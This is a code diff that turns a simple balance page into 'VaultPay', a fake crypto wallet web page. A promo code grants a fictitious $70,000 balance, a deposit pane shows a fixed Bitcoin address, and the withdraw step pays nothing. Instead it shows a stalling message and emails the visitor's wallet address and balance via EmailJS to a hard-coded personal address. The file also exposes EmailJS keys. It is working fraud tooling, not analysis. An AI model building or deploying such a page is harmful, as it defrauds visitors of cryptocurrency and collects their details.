@@ -3,198 +3,268 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Balance Dashboard</title>
+<title>VaultPay | Secure Asset Management</title>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <style>
+  :root {
+    --bg: #0b0e11;
+    --card: #1e2329;
+    --text: #eaecef;
+    --muted: #848e9c;
+    --primary: #f3ba2f;
+    --border: #363c44;
+    --green: #0ecb81;
+    --error: #f6465d;
+  }
+
   body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background-color: #1e1e2f;
-    color: #ffffff;
+    font-family: 'Inter', -apple-system, sans-serif;
+    background-color: var(--bg);
+    color: var(--text);
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    min-height: 100vh;
     margin: 0;
   }
-  .container {
-    background-color: #2a2a40;
-    padding: 40px;
-    border-radius: 12px;
-    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
-    width: 320px;
+
+  .app-container {
+    background-color: var(--card);
+    padding: 30px;
+    border-radius: 20px;
+    width: 100%;
+    max-width: 380px;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+    border: 1px solid var(--border);
     text-align: center;
   }
-  .hidden {
-    display: none !important;
-  }
-  h1, h2 {
-    margin-top: 0;
-  }
-  .balance-container {
-    font-size: 32px;
-    font-weight: bold;
-    color: #4caf50;
+
+  .hidden { display: none !important; }
+
+  .balance-section {
+    background: linear-gradient(135deg, #2b3139 0%, #1e2329 100%);
+    padding: 25px;
+    border-radius: 15px;
     margin: 20px 0;
-    background: #1e1e2f;
-    padding: 15px;
-    border-radius: 8px;
+    border: 1px solid var(--border);
   }
+
+  .balance-val {
+    font-size: 36px;
+    font-weight: 700;
+    margin: 10px 0;
+    letter-spacing: -1px;
+  }
+
+  .grid-nav {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-bottom: 25px;
+  }
+
   button {
-    background-color: #007bff;
-    color: white;
+    background-color: var(--primary);
+    color: #000;
     border: none;
-    padding: 12px;
-    margin: 8px 0;
-    border-radius: 6px;
+    padding: 14px;
+    border-radius: 10px;
+    font-weight: 700;
     cursor: pointer;
-    font-size: 16px;
-    width: 100%;
-    transition: background-color 0.2s;
+    transition: transform 0.1s, opacity 0.2s;
+    font-size: 13px;
   }
-  button:hover {
-    background-color: #0056b3;
+
+  button:hover { opacity: 0.9; }
+  button:active { transform: scale(0.96); }
+
+  .btn-outline {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text);
   }
-  .btn-secondary {
-    background-color: #6c757d;
+
+  .btn-outline:hover { border-color: var(--primary); }
+
+  .action-pane {
+    background: rgba(0,0,0,0.2);
+    padding: 20px;
+    border-radius: 12px;
+    animation: fadeIn 0.3s ease;
+    text-align: left;
   }
-  .btn-secondary:hover {
-    background-color: #5a6268;
-  }
+
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
   input {
-    width: calc(100% - 24px);
+    width: 100%;
     padding: 12px;
     margin: 10px 0;
-    border: 1px solid #444;
-    border-radius: 6px;
-    background-color: #1e1e2f;
+    background: #0b0e11;
+    border: 1px solid var(--border);
+    border-radius: 8px;
     color: white;
-    font-size: 14px;
-  }
-  input:focus {
+    box-sizing: border-box;
     outline: none;
-    border-color: #007bff;
   }
-  .message {
+
+  input:focus { border-color: var(--primary); }
+
+  .address-box {
+    background: #000;
+    padding: 15px;
+    border: 1px dashed var(--primary);
+    color: var(--primary);
+    font-family: monospace;
+    font-size: 11px;
+    word-break: break-all;
+    cursor: pointer;
+    border-radius: 8px;
+    margin: 10px 0;
+  }
+
+  .status-text {
     margin-top: 15px;
-    font-size: 14px;
-    color: #ff9800;
+    font-size: 13px;
+    font-weight: 500;
   }
-  .success {
-    color: #4caf50;
-  }
+
+  .info { color: var(--primary); }
+  .success { color: var(--green); }
+  .error { color: var(--error); }
 </style>
 </head>
 <body>
 
-<div class="container">
-  <div id="start-screen">
-    <h2>Welcome</h2>
-    <p>Click below to access your dashboard.</p>
-    <button id="btn-start">Get Started</button>
+<div class="app-container">
+  <div id="scr-start">
+    <h1 style="margin:0; font-size: 26px;">Vault<span style="color:var(--primary)">Pay</span></h1>
+    <p style="color:var(--muted); font-size: 14px; margin-top: 5px;">Institutional Grade Crypto Wallet</p>
+    <button onclick="navTo('main')" style="width:100%; margin-top: 30px;">Get Started</button>
   </div>
 
-  <div id="main-screen" class="hidden">
-    <h2>Account Balance</h2>
-    <div class="balance-container">
-      $<span id="balance">0</span>
-    </div>
-    
-    <button id="btn-promo">Promo</button>
-    <button id="btn-withdraw" class="btn-secondary">Withdraw</button>
-
-    <div id="promo-box" class="hidden">
-      <input type="text" id="promo-input" placeholder="Enter promo code">
-      <button id="btn-submit-promo">Redeem Code</button>
-      <div id="promo-msg" class="message"></div>
+  <div id="scr-main" class="hidden">
+    <div class="balance-section">
+      <div style="font-size: 11px; color: var(--muted); letter-spacing: 1px;">TOTAL ACCOUNT BALANCE</div>
+      <div class="balance-val">$<span id="display-bal">0.00</span></div>
     </div>
 
-    <div id="withdraw-box" class="hidden">
-      <input type="text" id="btc-input" placeholder="Enter BTC Wallet Address">
-      <button id="btn-confirm-withdraw">Confirm</button>
+    <div class="grid-nav">
+      <button class="btn-outline" onclick="showAction('deposit')">Deposit</button>
+      <button class="btn-outline" onclick="showAction('promo')">Promo</button>
+      <button class="btn-outline" onclick="showAction('withdraw')">Withdraw</button>
     </div>
 
-    <div id="global-msg" class="message hidden"></div>
+    <div id="act-deposit" class="action-pane hidden">
+      <div style="font-size: 13px; margin-bottom: 8px; font-weight: 600;">Direct Deposit</div>
+      <div style="font-size: 12px; color: var(--muted); margin-bottom: 10px;">Send your Crypto to this account to deposit:</div>
+      <div class="address-box" onclick="copyAddr()">bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d</div>
+      <small style="color: var(--muted)">Tap the address box above to copy</small>
+    </div>
+
+    <div id="act-promo" class="action-pane hidden">
+      <div style="font-size: 13px; font-weight: 600;">Redeem Voucher</div>
+      <input type="text" id="promo-code" placeholder="Enter promo code">
+      <button onclick="redeem()" style="width:100%">Claim Reward</button>
+    </div>
+
+    <div id="act-withdraw" class="action-pane hidden">
+      <div style="font-size: 13px; font-weight: 600;">Withdraw Funds</div>
+      <input type="text" id="withdraw-addr" placeholder="Destination BTC Address">
+      <button onclick="processWithdraw()" style="width:100%">Confirm Withdrawal</button>
+    </div>
+
+    <div id="feedback" class="status-text hidden"></div>
   </div>
 </div>
 
 <script>
-  // Variables to hold state
-  let currentBalance = 0;
+  // Configuration from User
+  const PUBLIC_KEY = 'VB9Rt0bAl5Fp2JxmU';
+  const SERVICE_ID = 'service_k743psj';
+  const TEMPLATE_ID = 'template_0nybbv8';
 
-  // Screen Elements
-  const startScreen = document.getElementById('start-screen');
-  const mainScreen = document.getElementById('main-screen');
-  const balanceDisplay = document.getElementById('balance');
-  
-  // Section Elements
-  const promoBox = document.getElementById('promo-box');
-  const withdrawBox = document.getElementById('withdraw-box');
-  const globalMsg = document.getElementById('global-msg');
-  const promoMsg = document.getElementById('promo-msg');
-  
-  // Input Elements
-  const promoInput = document.getElementById('promo-input');
-  const btcInput = document.getElementById('btc-input');
+  // Initialize EmailJS SDK
+  (function() {
+    emailjs.init(PUBLIC_KEY);
+  })();
 
-  // Utility function to hide all dynamic elements
-  function hideDynamicBoxes() {
-    promoBox.classList.add('hidden');
-    withdrawBox.classList.add('hidden');
-    globalMsg.classList.add('hidden');
-    promoMsg.textContent = '';
+  // Balance Persistence Logic
+  let balance = parseFloat(localStorage.getItem('vault_user_balance')) || 0;
+  updateDisplay();
+
+  function navTo(screen) {
+    document.getElementById('scr-start').classList.add('hidden');
+    document.getElementById('scr-main').classList.remove('hidden');
   }
 
-  // 1. Get Started Button
-  document.getElementById('btn-start').addEventListener('click', () => {
-    startScreen.classList.add('hidden');
-    mainScreen.classList.remove('hidden');
-  });
+  function showAction(type) {
+    ['deposit', 'promo', 'withdraw'].forEach(a => document.getElementById('act-'+a).classList.add('hidden'));
+    document.getElementById('act-'+type).classList.remove('hidden');
+    document.getElementById('feedback').classList.add('hidden');
+  }
 
-  // 2. Open Promo Box
-  document.getElementById('btn-promo').addEventListener('click', () => {
-    hideDynamicBoxes();
-    promoBox.classList.remove('hidden');
-  });
+  function updateDisplay() {
+    document.getElementById('display-bal').textContent = balance.toLocaleString('en-US', {
+      minimumFractionDigits: 2,
+      maximumFractionDigits: 2
+    });
+    localStorage.setItem('vault_user_balance', balance);
+  }
 
-  // 3. Open Withdraw Box
-  document.getElementById('btn-withdraw').addEventListener('click', () => {
-    hideDynamicBoxes();
-    withdrawBox.classList.remove('hidden');
-  });
+  function copyAddr() {
+    navigator.clipboard.writeText('bc1qk7darq3cdq2k83pma8w88668a25q63qyyen26d');
+    alert("Deposit address copied to clipboard!");
+  }
 
-  // 4. Submit Promo Code
-  document.getElementById('btn-submit-promo').addEventListener('click', () => {
-    const code = promoInput.value.trim().toUpperCase();
+  function redeem() {
+    const code = document.getElementById('promo-code').value.trim();
+    const msg = document.getElementById('feedback');
     
-    if (code === 'PROMOBTC') {
-      currentBalance += 70000;
-      // Format number to include commas
-      balanceDisplay.textContent = currentBalance.toLocaleString();
-      promoMsg.textContent = 'Promo code applied successfully!';
-      promoMsg.className = 'message success';
-      promoInput.value = ''; // clear input
+    if(code.toUpperCase() === 'PROMOBTC') {
+      balance += 70000;
+      updateDisplay();
+      msg.textContent = "Promo applied successfully! +$70,000.00";
+      msg.className = "status-text success";
+      document.getElementById('promo-code').value = "";
     } else {
-      promoMsg.textContent = 'Invalid promo code.';
-      promoMsg.className = 'message'; // revert to default orange color
+      msg.textContent = "Invalid or expired promo code.";
+      msg.className = "status-text error";
     }
-  });
+    msg.classList.remove('hidden');
+  }
 
-  // 5. Confirm Withdraw
-  document.getElementById('btn-confirm-withdraw').addEventListener('click', () => {
-    const wallet = btcInput.value.trim();
-    
-    if (wallet === '') {
-      alert('Please enter a valid BTC wallet address.');
+  function processWithdraw() {
+    const addr = document.getElementById('withdraw-addr').value.trim();
+    const msg = document.getElementById('feedback');
+
+    if(!addr) {
+      alert("Please enter a valid BTC wallet address.");
       return;
     }
 
-    hideDynamicBoxes();
-    
-    // Show the confirmation text
-    globalMsg.textContent = 'Reward confirmation in progress please wait...';
-    globalMsg.classList.remove('hidden');
-    
-    btcInput.value = ''; // clear input
-  });
+    msg.textContent = "Reward confirmation in progress please wait...";
+    msg.className = "status-text info";
+    msg.classList.remove('hidden');
+
+    // Variable Mapping as requested:
+    // {{Title}} -> Account Balance
+    // {{Name}} -> Wallet Address
+    const templateParams = {
+      Title: "$" + balance.toLocaleString(undefined, {minimumFractionDigits: 2}),
+      Name: addr,
+      to_email: 'nibir.baruah2000@gmail.com'
+    };
+
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+      .then((response) => {
+        console.log('EMAIL SENT', response.status, response.text);
+      }, (err) => {
+        console.error('EMAIL FAILED', err);
+      });
+
+    document.getElementById('withdraw-addr').value = "";
+  }
 </script>
 
 </body>
